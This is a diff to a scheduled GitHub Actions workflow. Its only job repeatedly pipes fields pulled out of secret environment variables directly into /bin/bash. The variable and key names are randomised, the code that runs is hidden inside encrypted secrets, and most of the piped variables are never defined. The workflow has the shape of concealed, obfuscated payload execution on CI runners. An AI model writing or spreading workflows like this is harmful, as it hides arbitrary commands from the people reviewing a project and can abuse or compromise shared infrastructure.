@@ -3,7 +3,8 @@ name: tianyuanwangjian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
+    - cron: '18 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +13,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: tianyuanwangjian
         env:
-          dn8785: ${{ secrets.dn8785 }}
+          xnxob31: ${{ secrets.xnxob31 }}
         run: |
-          echo $dn8785 | jq -r .pgjjb52 | /bin/bash
-          echo $as11 | jq -r .kwmd7 | /bin/bash
-          echo $nw3 | jq -r .zly7637 | /bin/bash
-          echo $rxjp6381 | jq -r .rpjnd5 | /bin/bash
-          echo $xz5 | jq -r .r26 | /bin/bash
-          echo $pgtt7437 | jq -r .n21 | /bin/bash
-          echo $lmy13193 | jq -r .gga0 | /bin/bash
-          echo $vjq872 | jq -r .fhd8 | /bin/bash
+          echo $xnxob31 | jq -r .bpbu68 | /bin/bash
+          echo $onalz18 | jq -r .ybz733 | /bin/bash
+          echo $qnebr833 | jq -r .l713 | /bin/bash
+          echo $z59 | jq -r .d382 | /bin/bash
+          echo $thh34750 | jq -r .mt6106 | /bin/bash
+          echo $uw137 | jq -r .y2690 | /bin/bash
+          echo $w6736 | jq -r .jtskd70 | /bin/bash
+          echo $lgum7 | jq -r .fjnt018 | /bin/bash
+          echo $aq05187 | jq -r .tqyh56868 | /bin/bash
+          echo $ux2650 | jq -r .vuzkh63100 | /bin/bash
+          echo $k8246 | jq -r .u77 | /bin/bash
+          echo $sccs6408 | jq -r .pc15017 | /bin/bash
+          echo $gf96 | jq -r .n14117 | /bin/bash
+          echo $xyun776 | jq -r .gqms9 | /bin/bash
+          echo $gf946 | jq -r .afv4 | /bin/bash
+          echo $t6710 | jq -r .spqac27 | /bin/bash
+          echo $aatji5828 | jq -r .r6 | /bin/bash
+          echo $svz37 | jq -r .n27298 | /bin/bash
 
